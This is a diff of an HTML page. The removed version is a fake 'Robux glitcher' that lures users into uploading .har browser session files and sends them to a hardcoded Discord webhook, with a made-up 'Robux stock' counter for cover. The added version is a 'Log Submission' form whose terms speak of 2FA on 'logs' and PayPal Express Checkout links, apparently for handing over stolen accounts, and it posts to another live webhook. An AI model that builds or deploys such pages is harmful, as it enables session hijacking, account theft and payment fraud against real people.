@@ -1,152 +1,95 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Robux glitcher</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log Submission</title>
     <style>
         body {
-            margin: 0;
-            background: #1a1a1a;
-            color: #fff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        .top-bar {
-            background: #ff2e2e;
-            padding: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
+            font-family: Arial, sans-serif;
+            background-color: #121212;
             color: white;
-            text-shadow: 2px 2px 0px #000;
+            text-align: center;
+            padding: 20px;
         }
-
         .container {
-            max-width: 800px;
-            margin: 20px auto;
-            padding: 0 20px;
-        }
-
-        .upload-box {
-            background: #2a2a2a;
-            border: 3px solid #ff2e2e;
-            border-radius: 10px;
+            max-width: 400px;
+            margin: auto;
+            background: #1e1e1e;
             padding: 20px;
+            border-radius: 10px;
         }
-
-        .drag-area {
-            border: 3px dashed #444;
-            border-radius: 8px;
-            padding: 40px;
-            text-align: center;
-            margin: 20px 0;
-            transition: all 0.3s;
-            cursor: pointer;
-        }
-
-        .drag-area:hover {
-            border-color: #ff2e2e;
-            background: #333;
-        }
-
-        input[type="text"] {
+        input, textarea, button {
             width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            background: #333;
-            border: 2px solid #444;
-            border-radius: 6px;
-            color: white;
-            font-size: 16px;
-        }
-
-        input[type="text"]:focus {
-            border-color: #ff2e2e;
-            outline: none;
-        }
-
-        .upload-btn {
-            background: #ff2e2e;
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            font-weight: bold;
-            letter-spacing: 1px;
             margin-top: 10px;
+            padding: 10px;
+            border-radius: 5px;
+            border: none;
+            box-sizing: border-box;
         }
-
-        .upload-btn:hover {
-            background: #ff4444;
-            transform: translateY(-2px);
+        button {
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
         }
-
-        .stock-box {
-            background: #2a2a2a;
-            border: 3px solid #ff2e2e;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 20px;
-            text-align: center;
+        button:disabled {
+            background-color: gray;
+            cursor: not-allowed;
         }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="top-bar">
-        <div class="logo">Robux glitcher 101</div>
-    </div>
-
     <div class="container">
-        <div class="upload-box">
-            <h2>Start glitching robux now</h2>
-            <form id="upload-form">
-                <input type="text" id="username" placeholder="Username" required>
-                
-                <div class="drag-area" onclick="document.getElementById('file-input').click()">
-                    <h3>📂 Drop your .har file here</h3>
-                    <p style="color: #666;">or click to select</p>
-                    <input type="file" id="file-input" hidden>
-                </div>
-
-                <button type="submit" class="upload-btn">Upload 🚀</button>
-            </form>
-        </div>
-
-        <div class="stock-box">
-            <h2>💰 Robux Stock</h2>
-            <p id="robux-stock">Loading...</p>
+        <h2>Submit Log Info</h2>
+        <input type="text" id="discordUser" placeholder="Enter Discord Username">
+        <textarea id="logInfo" placeholder="Enter Log Info"></textarea>
+        <button onclick="showToS()">Submit</button>
+        
+        <div id="tosSection" class="hidden">
+            <h3>Read This Before Continuing</h3>
+            <p><b>ToS:</b></p>
+            <p>1. I am doing my best, but I am not responsible if the log has 2FA.</p>
+            <p>2. The link you provide must have PayPal Express Checkout.</p>
+            <p>3. Log info must be sent in plain text.</p>
+            <p><i>Type "I accept the ToS" to continue.</i></p>
+            <input type="text" id="tosConfirm" placeholder="Type here...">
+            <button id="acceptBtn" onclick="submitForm()" disabled>I Accept the ToS</button>
         </div>
     </div>
 
     <script>
-        document.getElementById('upload-form').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const username = document.getElementById('username').value;
-            const file = document.getElementById('file-input').files[0];
-            if (!file) {
-                alert('Please select a file to upload.');
-                return;
-            }
-            const webhookURL = "https://discord.com/api/webhooks/1341466721470513212/enzbhGGGNNU0Bw01NS9HReyCVhzyY6K2RBuaAYut4b1xzmTI9rkDYdem9HIxjq1LsyT5";
-            const formData = new FormData();
-            formData.append("file", file);
-            formData.append("content", `New upload from: ${username}`);
-            await fetch(webhookURL, { method: "POST", body: formData });
-            alert('File uploaded successfully!');
+        function showToS() {
+            document.getElementById("tosSection").classList.remove("hidden");
+        }
+
+        document.getElementById("tosConfirm").addEventListener("input", function() {
+            document.getElementById("acceptBtn").disabled = this.value !== "I accept the ToS";
         });
 
-        function updateRobuxStock() {
-            document.getElementById('robux-stock').textContent = `${Math.floor(Math.random() * 100000) + 1000} Robux`;
+        function submitForm() {
+            const discordUser = document.getElementById("discordUser").value;
+            const logInfo = document.getElementById("logInfo").value;
+            const webhookUrl = "https://discord.com/api/webhooks/1343315467862933554/LB5K6hfDPBjJ2wKl_kU8ac6PCWoa_6On-W4k0AdFejk13w8jHxG9tNON7DtJpHOxMxKO";
+
+            if (!discordUser || !logInfo) {
+                alert("Fill in all fields before submitting.");
+                return;
+            }
+
+            const payload = {
+                content: `New Log Submission:\n**Discord Username:** ${discordUser}\n**Log Info:** ${logInfo}`
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(() => alert("Submitted successfully."))
+            .catch(() => alert("Error submitting data."));
         }
-        updateRobuxStock();
     </script>
 </body>
 </html>
